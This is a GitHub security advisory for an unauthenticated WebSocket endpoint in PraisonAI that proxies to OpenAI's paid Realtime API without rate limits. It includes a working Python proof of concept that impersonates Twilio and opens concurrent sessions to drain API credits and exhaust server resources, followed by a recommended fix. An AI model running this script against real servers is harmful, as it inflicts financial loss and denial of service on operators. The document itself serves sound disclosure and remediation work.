# [H] PraisonAI: Unauthenticated WebSocket Endpoint Proxies to Paid OpenAI Realtime API Without Rate Limits

## Summary
Severity: High
Advisory: GHSA-q5r4-47m9-5mc7
CVE: CVE-2026-40116
CWE: CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-q5r4-47m9-5mc7
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.5.128

## Details
## Summary

The `/media-stream` WebSocket endpoint in PraisonAI's call module accepts connections from any client without authentication or Twilio signature validation. Each connection opens an authenticated session to OpenAI's Realtime API using the server's API key. There are no limits on concurrent connections, message rate, or message size, allowing an unauthenticated attacker to exhaust server resources and drain the victim's OpenAI API credits.

## Details

The vulnerability exists in `src/praisonai/praisonai/api/call.py`. The FastAPI application defines a WebSocket endpoint at line 108 with no authentication middleware, no Twilio request signature validation, and no rate limiting:

```python
# line 108-112 — no auth, no middleware, accepts any WebSocket client
@app.websocket("/media-stream")
async def handle_media_stream(websocket: WebSocket):
    """Handle WebSocket connections between Twilio and OpenAI."""
    print("Client connected")
    await websocket.accept()
```

Immediately upon connection, the handler opens an authenticated session to OpenAI's paid Realtime API using the server's `OPENAI_API_KEY`:

```python
# line 114-120 — each unauthenticated connection spawns a paid API session
    async with websockets.connect(
        'wss://api.openai.com/v1/realtime?model=gpt-4o-realtime-preview-2024-10-01',
        extra_headers={
            "Authorization": f"Bearer {OPENAI_API_KEY}",
            "OpenAI-Beta": "realtime=v1"
        }
    ) as openai_ws:
```

The `receive_from_twilio()` coroutine then reads unlimited messages and forwards them directly to OpenAI:

```python
# line 128-135 — unbounded message ingestion, no size/rate check
                async for message in websocket.iter_text():
                    data = json.loads(message)
                    if data['event'] == 'media' and openai_ws.open:
                        audio_append = {
                            "type": "input_audio_buffer.append",
                            "audio": data['media']['payload']
                        }
                        await openai_ws.send(json.dumps(audio_append))
```

The server binds to `0.0.0.0` (line 273) and can be exposed to the internet via ngrok (`--public` flag). Twilio's `RequestValidator` is never used — the endpoint was designed to receive Twilio media streams but performs no verification that the connecting client is actually Twilio. The standard mitigation for Twilio WebSocket endpoints is to validate the `X-Twilio-Signature` header, which is absent here.

Additionally, `uvicorn.run()` is called without a `ws_max_size` parameter (line 273), defaulting to 16MB per WebSocket message. Combined with no connection limit, this allows substantial memory consumption.

## PoC

```bash
# Step 1: Verify the endpoint is accessible and accepts connections
python3 -c "
import asyncio
import websockets
import json

async def test():
    async with websockets.connect('ws://TARGET:8090/media-stream') as ws:
        # Send a start event (mimicking Twilio)
        await ws.send(json.dumps({
            'event': 'start',
            'start': {'streamSid': 'attacker-session-1'}
        }))
        # Send a media event — this gets forwarded to OpenAI Realtime API
        await ws.send(json.dumps({
            'event': 'media',
            'media': {'payload': 'SGVsbG8gV29ybGQ='}
        }))
        # Receive the OpenAI response routed back
        response = await asyncio.wait_for(ws.recv(), timeout=10)
        print('Received response (confirms OpenAI session active):', response[:200])

asyncio.run(test())
"

# Step 2: Demonstrate resource exhaustion — open multiple concurrent connections
# Each connection spawns an OpenAI Realtime API session billed to the server owner
python3 -c "
import asyncio
import websockets
import json
import base64

async def open_session(i):
    uri = 'ws://TARGET:8090/media-stream'
    async with websockets.connect(uri) as ws:
        await ws.send(json.dumps({
            'event': 'start',
            'start': {'streamSid': f'attacker-{i}'}
        }))
        # Send audio data to keep the OpenAI session active and billing
        payload = base64.b64encode(b'\\x00' * 8000).decode()  # ~8KB audio chunk
        for _ in range(100):
            await ws.send(json.dumps({
                'event': 'media',
                'media': {'payload': payload}
            }))
            await asyncio.sleep(0.01)
        print(f'Session {i}: sent 100 audio chunks to OpenAI via proxy')

async def main():
    # Open 10 concurrent sessions (each consuming OpenAI Realtime API credits)
    await asyncio.gather(*[open_session(i) for i in range(10)])

asyncio.run(main())
"
```

Replace `TARGET` with the server's hostname/IP. Each connection in Step 2 opens a separate authenticated OpenAI Realtime API session. The server logs will show "Client connected" and "Incoming stream has started" for each attacker session.

## Impact

1. **OpenAI API credit drain**: Each unauthenticated WebSocket connection opens a billed OpenAI Realtime API session. An attacker can open many concurrent sessions and stream audio data, accumulating charges on the victim's OpenAI account. The Realtime API bills per-second of audio, making this financially impactful.

2. **Denial of service**: Legitimate Twilio callers are denied service when the server's resources (memory, file descriptors, OpenAI API rate limits) are exhausted by attacker connections.

3. **Server memory exhaustion**: With no per-message size limit (16MB default) and no connection limit, an attacker can consume server memory by opening many connections and sending large payloads.

## Recommended Fix

Add Twilio signature validation, connection limits, and rate limiting:

```python
from twilio.request_validator import RequestValidator
from starlette.websockets import WebSocketState
import time

# Connection tracking
MAX_CONCURRENT_CONNECTIONS = 20
active_connections = 0
connection_lock = asyncio.Lock()

TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')

@app.websocket("/media-stream")
async def handle_media_stream(websocket: WebSocket):
    global active_connections
    
    # Enforce connection limit
    async with connection_lock:
        if active_connections >= MAX_CONCURRENT_CONNECTIONS:
            await websocket.close(code=1008, reason="Too many connections")
            return
        active_connections += 1
    
    try:
        # Validate Twilio signature if auth token is configured
        if TWILIO_AUTH_TOKEN:
            validator = RequestValidator(TWILIO_AUTH_TOKEN)
            url = str(websocket.url).replace("ws://", "http://").replace("wss://", "https://")
            signature = websocket.headers.get("X-Twilio-Signature", "")
            if not validator.validate(url, {}, signature):
                await websocket.close(code=1008, reason="Invalid signature")
                return
        
        await websocket.accept()
        # ... rest of handler ...
    finally:
        async with connection_lock:
            active_connections -= 1
```

Additionally, pass `ws_max_size` to uvicorn to limit individual message sizes:

```python
uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning", ws_max_size=1_048_576)  # 1MB
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-q5r4-47m9-5mc7
- https://nvd.nist.gov/vuln/detail/CVE-2026-40116
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.128
